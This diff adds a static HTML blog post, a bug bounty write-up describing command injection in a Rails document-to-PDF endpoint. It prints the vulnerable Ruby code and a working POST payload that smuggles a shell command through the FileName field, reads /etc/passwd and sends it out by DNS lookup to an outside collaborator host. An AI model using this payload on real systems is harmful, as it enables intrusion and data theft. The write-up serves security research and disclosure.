@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Basic recon to RCE III | Joshua MARTINELLE</title>
+<meta property="og:title" content="Basic recon to RCE III | Joshua MARTINELLE" />
+<meta name="twitter:title" content="Basic recon to RCE III | Joshua MARTINELLE" />
+<meta itemprop="name" content="Basic recon to RCE III | Joshua MARTINELLE" />
+<meta name="application-name" content="Basic recon to RCE III | Joshua MARTINELLE" />
+<meta property="og:site_name" content="Joshua MARTINELLE" />
+
+<meta name="description" content="Basic recon to RCE II">
+<meta itemprop="description" content="Basic recon to RCE II" />
+<meta property="og:description" content="Basic recon to RCE II" />
+<meta name="twitter:description" content="Basic recon to RCE II" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/2022/basic_recon_to_rce_iii/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2022-10-18T18:00:00&#43;0100 />
+    <meta property="article:published_time" content=2022-10-18T18:00:00&#43;0100 />
+    <meta property="og:url" content="http://localhost:1313/posts/2022/basic_recon_to_rce_iii/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Basic recon to RCE III",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2022-10-18",
+        "description": "Basic recon to RCE II",
+        "wordCount":  1331 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2022-10-18",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Joshua MARTINELLE"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.145.0">
+
+    
+    <meta property="og:url" content="http://localhost:1313/posts/2022/basic_recon_to_rce_iii/">
+  <meta property="og:site_name" content="Joshua MARTINELLE">
+  <meta property="og:title" content="Basic recon to RCE III">
+  <meta property="og:description" content="Basic recon to RCE II">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-10-18T18:00:00+01:00">
+    <meta property="article:modified_time" content="2022-10-18T18:00:00+01:00">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Basic recon to RCE III">
+  <meta name="twitter:description" content="Basic recon to RCE II">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/2022/basic_recon_to_rce_iii/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "light" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav
+        class="menu"
+        aria-label="Main Navigation"
+        style="
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            padding: 0 10px;
+        "
+    >
+        <div style="display: flex; align-items: center; gap: 10px">
+            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#000000" width="25" height="25" stroke-width="0.304"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M15 1H1V15H15V1ZM6 5L7.41421 6.41421L5.82843 8L7.41421 9.58579L6 11L3 8L6 5ZM10 5L8.58579 6.41421L10.1716 8L8.58579 9.58579L10 11L13 8L10 5Z" fill="#ffffff"></path> </g></svg>
+
+            <a
+                href="/"
+                style="font-weight: bold; text-decoration: none; color: inherit"
+                >Joshua MARTINELLE</a
+            >
+        </div>
+
+        <div style="display: flex; align-items: center; margin-right: 2vh">
+            <a
+                href="https://github.com/JoshuaMART"
+                class="logo"
+                style="margin-right: 12px; display: block"
+            >
+                <svg class="mode-sunny" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="currentColor" width="20" height="20"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>GITHUB</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="currentColor"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M94,7399 C99.523,7399 104,7403.59 104,7409.253 C104,7413.782 101.138,7417.624 97.167,7418.981 C96.66,7419.082 96.48,7418.762 96.48,7418.489 C96.48,7418.151 96.492,7417.047 96.492,7415.675 C96.492,7414.719 96.172,7414.095 95.813,7413.777 C98.04,7413.523 100.38,7412.656 100.38,7408.718 C100.38,7407.598 99.992,7406.684 99.35,7405.966 C99.454,7405.707 99.797,7404.664 99.252,7403.252 C99.252,7403.252 98.414,7402.977 96.505,7404.303 C95.706,7404.076 94.85,7403.962 94,7403.958 C93.15,7403.962 92.295,7404.076 91.497,7404.303 C89.586,7402.977 88.746,7403.252 88.746,7403.252 C88.203,7404.664 88.546,7405.707 88.649,7405.966 C88.01,7406.684 87.619,7407.598 87.619,7408.718 C87.619,7412.646 89.954,7413.526 92.175,7413.785 C91.889,7414.041 91.63,7414.493 91.54,7415.156 C90.97,7415.418 89.522,7415.871 88.63,7414.304 C88.63,7414.304 88.101,7413.319 87.097,7413.247 C87.097,7413.247 86.122,7413.234 87.029,7413.87 C87.029,7413.87 87.684,7414.185 88.139,7415.37 C88.139,7415.37 88.726,7417.2 91.508,7416.58 C91.513,7417.437 91.522,7418.245 91.522,7418.489 C91.522,7418.76 91.338,7419.077 90.839,7418.982 C86.865,7417.627 84,7413.783 84,7409.253 C84,7403.59 88.478,7399 94,7399" id="github-[#142]"> </path> </g> </g> </g> </g></svg>
+
+            </a>
+
+            <a id="mode" href="#" style="display: block">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="20" height="20" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg> <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="20" height="20" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Basic recon to RCE III</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2022-10-18T18:00:00&#43;01:00" itemprop="datePublished"> 18 Oct 2022 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/posts/2022/basic_recon_to_rce_iii/banner.png" alt=""></p>
+<p>For the 3rd and I think last episode of the series, we&rsquo;re going to continue with the same target as the episode 2, that I recommend you to go and see at first to put you a bit more in the context : <a href="/posts/2022/basic_recon_to_rce_ii/">Basic recon to RCE II</a></p>
+<h2 id="the-story">The Story</h2>
+<p>So, after this first RCE discovered on the application, I wanted to continue to dig, especially because this debug mode displays a POST method on the endpoint <code>/convertdoctopdf</code>. So I immediately thought about a SSRF and as it&rsquo;s a bug that I like quite a lot, I wanted to dig it.</p>
+<p>Another advantage of the debug mode (on Rails and maybe with other frameworks) is that if the application raises an exception, it will show you the part of the source code concerned in the response, which is pretty handy when you don&rsquo;t know which parameter you should use !</p>
+<p>After a first POST request without body, the application displays an error 500 with the piece of code that concerns the error, which tells us that the <code>SessionId</code> parameter is missing. I spare you the details but this technique allowed me to obtain the complete code of the method :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convertdoctopdf</span>
+</span></span><span class="line"><span class="cl">  <span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span> <span class="o">=&gt;</span><span class="s1">&#39;application/json&#39;</span><span class="p">,</span><span class="s1">&#39;Authorization&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;OAuth &#39;</span><span class="o">+</span><span class="n">params</span><span class="o">[</span><span class="s1">&#39;SessionId&#39;</span><span class="o">]</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">id</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="s1">&#39;AttachmentId&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">baseURL</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="s1">&#39;Url&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fileName</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="s1">&#39;FileName&#39;</span><span class="o">]</span> <span class="p">?</span> <span class="n">params</span><span class="o">[</span><span class="s1">&#39;FileName&#39;</span><span class="o">]+</span><span class="p">(</span><span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span> <span class="p">:</span> <span class="s1">&#39;fileconvert&#39;</span><span class="o">+</span><span class="p">(</span><span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">baseURL</span><span class="o">+</span><span class="s2">&#34;/services/data/v44.0/sobjects/Attachment/&#34;</span><span class="o">+</span><span class="nb">id</span><span class="o">+</span><span class="s2">&#34;/Body&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">https</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">host</span><span class="p">,</span><span class="n">uri</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">https</span><span class="o">.</span><span class="n">use_ssl</span> <span class="o">=</span> <span class="kp">true</span>
+</span></span><span class="line"><span class="cl">  <span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Get</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">header</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">attachment</span> <span class="o">=</span> <span class="n">https</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.docx&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">attachment</span><span class="o">.</span><span class="n">body</span><span class="p">)</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="sx">%x(/usr/bin/soffice --headless --convert-to pdf --outdir  &#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="sx">/public/file_conversion/&#34; &#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="sx">/public/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.docx&#39;</span><span class="si">}</span><span class="sx">&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">outputfileBase64</span> <span class="o">=</span> <span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/file_conversion/</span><span class="si">#{</span><span class="n">fileName</span><span class="si">}</span><span class="s2">.pdf&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="o">.</span><span class="n">join</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="no">File</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/file_conversion/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.pdf&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="no">File</span><span class="o">.</span><span class="n">exist?</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/file_conversion/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.pdf&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="no">File</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.docx&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="no">File</span><span class="o">.</span><span class="n">exist?</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.docx&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">render</span> <span class="ss">json</span><span class="p">:</span> <span class="p">{</span><span class="ss">file</span><span class="p">:</span> <span class="n">outputfileBase64</span><span class="p">},</span> <span class="ss">status</span><span class="p">:</span> <span class="ss">:created</span><span class="p">,</span> <span class="ss">location</span><span class="p">:</span> <span class="s2">&#34;Done&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></div><p>Which can be described as follows:</p>
+<ul>
+<li><code>header</code> = Expects the SessionID parameter but is not important here, you can put anything</li>
+<li><code>id</code> = Waits for the AttachmentId parameter but is not important either, you can put anything too</li>
+<li><code>baseUrl</code> = Waits for the url parameter, just enter a valid URL</li>
+<li><code>fileName</code> = There is a ternary condition that makes it an optional parameter</li>
+<li>Then a GET request is made, the content is saved to a file, converted to PDF and displayed to the user in base64</li>
+</ul>
+<p>I had first stopped after leaking the HTTP request line thinking that was all I needed to trigger my SSRF. Except:</p>
+<ul>
+<li>A GET request is made on the <code>URL + path /services/data/v44.0/sobjects/Attachment/&quot;+id+&quot;/Body&quot;</code> but that can be easily bypassed by specifying a URL of type <code>https://domain.tld/?x=</code>, the path will then be forced as the parameter value.
+<ul>
+<li>The URL will become: <code>https://domain.tld/?x=/services/data/v44.0/sobjects/Attachment/&quot;+id+&quot;/Body&quot;</code></li>
+</ul>
+</li>
+<li><code>https.use_ssl</code> = true which is the blocking point because it forces the use of HTTPS</li>
+</ul>
+<p>Going back to our source code, I was saying that the body of the response is saved in a file (with the extension docx but in fact it doesn&rsquo;t matter, it&rsquo;s not a real docx but rather a simple text file) and then the soffice binary is called and converts this file into a PDF and displays the content of the PDF in base64 in the response. Something I didn&rsquo;t know yet because I was too focused on the SSRF and I could see in the return of my request in the answer and I didn&rsquo;t try to understand the cause.</p>
+<p>I spent a few hours on the SSRF without being able to exploit it because :</p>
+<ul>
+<li>The use of HTTPS prevents me from typing on internal URLs such as http://127.0.0.1</li>
+<li>The target must have a valid certificate</li>
+<li>For some reason I couldn&rsquo;t query a target using a let&rsquo;s encrypt certificate&hellip;</li>
+</ul>
+<p>Anyway, after these blocking points, to try to inject some code in my PDF I used a Github repository on which I uploaded my PoC then I used the RAW URL (like <code>https://raw.githubusercontent.com/user/poc/master/poc.html</code>) to inject the content in the PDF. Unfortunately after many tries, the only tag that seemed to be interpreted was the <code>&lt;title&gt;</code> tag, the others were either deleted or not interpreted.</p>
+<p>A little disappointed at the time, I gave up because I had other things to do.
+That same day I spent the evening with my hunter friend Serizao, and I obviously told him my SSRF problem, we continued to dig together and to have a better overview, we recovered the complete code of the method above.</p>
+<p>At this moment, a line directly appealed to us.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="sx">%x(/usr/bin/soffice --headless --convert-to pdf --outdir  &#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="sx">/public/file_conversion/&#34; &#34;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="sx">/public/</span><span class="si">#{</span><span class="n">fileName</span><span class="o">+</span><span class="s1">&#39;.docx&#39;</span><span class="si">}</span><span class="sx">&#34;)</span>
+</span></span></code></pre></div><p>The use of <code>%x()</code> is an alternative to the use of backticks which allows you to make a system call and display the output. Like backticks, <code>%x()</code> also allows string interpolation.</p>
+<p>I explained above, that the FileName parameter is optional :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">fileName</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="s1">&#39;FileName&#39;</span><span class="o">]</span> <span class="p">?</span> <span class="n">params</span><span class="o">[</span><span class="s1">&#39;FileName&#39;</span><span class="o">]+</span><span class="p">(</span><span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span> <span class="p">:</span> <span class="s1">&#39;fileconvert&#39;</span><span class="o">+</span><span class="p">(</span><span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span>
+</span></span></code></pre></div><p>Because if it is not present, it is set with a default value automatically, but if it is present, it is equivalent to the user input (and this is where the vulnerability lies). The problem is that the string interpolation allows to inject an arbitrary command to execute an additional command to the soffice binary call.</p>
+<p>Example to illustrate my point, inside <code>irb</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">1</span> <span class="p">:</span><span class="mo">001</span> <span class="o">&gt;</span> <span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;`id`&#39;</span><span class="o">+</span><span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span><span class="o">.</span><span class="n">to_s</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">1</span> <span class="p">:</span><span class="mo">002</span> <span class="o">&gt;</span> <span class="sx">%x(&#34;</span><span class="si">#{</span><span class="n">filename</span><span class="si">}</span><span class="sx">&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="ss">sh</span><span class="p">:</span> <span class="n">uid</span><span class="o">=</span><span class="mi">635388061</span><span class="p">(</span><span class="n">jomar</span><span class="p">)</span> <span class="o">[...]</span><span class="mi">1646581930</span><span class="p">:</span> <span class="n">command</span> <span class="ow">not</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl"> <span class="o">=&gt;</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">1</span> <span class="p">:</span><span class="mo">003</span> <span class="o">&gt;</span>
+</span></span></code></pre></div><p>So we can see that the id command is executed.
+With the following request, it is possible to escape the call to soffice and execute an arbitrary command, to show the vulnerability, I extracted the first characters of the <code>/etc/passwd</code> file :</p>
+<pre tabindex="0"><code>POST /convertdoctopdf HTTP/1.1
+Host: sub.target.tld
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 214
+Content-Type: application/json;charset=UTF-8
+
+{
+  &#34;SessionId&#34;:&#34;1&#34;,
+  &#34;AttachmentId&#34;:&#34;1&#34;,
+  &#34;FileName&#34;: &#34;\&#34; &amp;&amp; getent hosts $(`echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d`).9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld #\&#34;&#34;,
+  &#34;Url&#34;:&#34;https://www.google.com&#34;
+}
+</code></pre><p><em>Side note</em> : a domain name can be 255 characters long but a subdomain is limited to 63 characters, think about it if you do a DNS extraction</p>
+<p>Explanation of</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s2">&#34;\&#34; &amp;&amp; getent hosts </span><span class="k">$(</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg</span><span class="o">==</span> <span class="p">|</span> base64 -d<span class="sb">`</span><span class="k">)</span><span class="s2">.9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld #\&#34;
+</span></span></span></code></pre></div><ul>
+<li><code>\&quot;</code> : Allows to close the parameter pass to soffice binary for the file name</li>
+<li><code>&amp;&amp;</code> : Indicates that a second command is being processed</li>
+<li><code>getent hosts</code> : Not having <code>curl</code>, <code>dig</code>, <code>ping</code> etc&hellip; available in the environment I used <code>getent hosts</code> to execute a DNS query</li>
+<li><code>$(echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d)</code> : To avoid encoding problems because of the <code>/</code> which raises an error with the File.open so, we put our command in base64
+<ul>
+<li><code>echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d =&gt; head -c 4 /etc/passwd</code>. The first 4 characters of the <code>/etc/passwd</code> file which correspond to root
+<ul>
+<li><code>9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld</code> : My private burp collaborator server</li>
+<li><code>#\&quot;</code> : Allows you to comment out the end of the line and the <code>&quot;</code> to avoid a syntax error in the command</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>In the end, the executed command will be :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/soffice --headless --convert-to pdf --outdir <span class="s2">&#34;folder/public/file_conversion/&#34;</span> <span class="s2">&#34;folder/public/&#34;</span> <span class="o">&amp;&amp;</span> getent hosts <span class="k">$(</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg</span><span class="o">==</span> <span class="p">|</span> base64 -d<span class="sb">`</span><span class="k">)</span>.9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld <span class="c1">#\&#34;.pdf&#34;).to_a.join);</span>
+</span></span></code></pre></div><p><img src="/posts/2022/basic_recon_to_rce_iii/RCE_POC.png" alt="RCE_PoC"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>A bug that I found super interesting and was also present for a long time. I know because I had already identified this method more than 6 months ago but I had not taken the time to dig.</p>
+<p>What made the difference today is something that is very well explained here: <a href="https://twitter.com/hacker_/status/1509147518638116866">Corben Leo - Hacking CAN be easy</a>. I&rsquo;ve been developing small web / api applications on my own time for several months now and I use Ruby on Rails, in addition to giving me a good knowledge of the framework, it also gives me a better vision of a developer and sometimes I do sh*t because I want to go fast or because it annoys me and if I make these mistakes, why shouldn&rsquo;t others do it too ?</p>
+<p>But also probably because rather than going from domain to domain looking for the ugly stuff that looks vulnerable, I thought I really wanted to exploit this thing and so I spent some time on it. Which shows once again that sometimes it&rsquo;s much more interesting to focus on an application and understand it than to try to find a magic domain and spread payloads around without understanding what you&rsquo;re doing</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2025 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
